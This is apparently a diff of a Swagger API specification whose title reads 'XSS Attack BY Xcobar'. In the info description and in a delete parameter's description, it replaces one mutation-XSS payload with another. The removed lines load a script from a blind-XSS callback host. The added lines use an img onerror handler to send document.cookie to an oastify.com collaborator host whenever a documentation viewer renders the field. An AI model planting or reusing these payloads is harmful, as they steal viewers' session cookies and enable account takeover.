@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY Xcobar
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script src=https://xcobar.bxss.in></script>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://uoma696zt30q0qxbzs14womhl8ryfn.oastify.com/?'+document.cookie;>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script src=https://xcobar.bxss.in></script>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=this.src='https://uoma696zt30q0qxbzs14womhl8ryfn.oastify.com/?'+document.cookie;>"></form>
 
           format: int64
           in: path
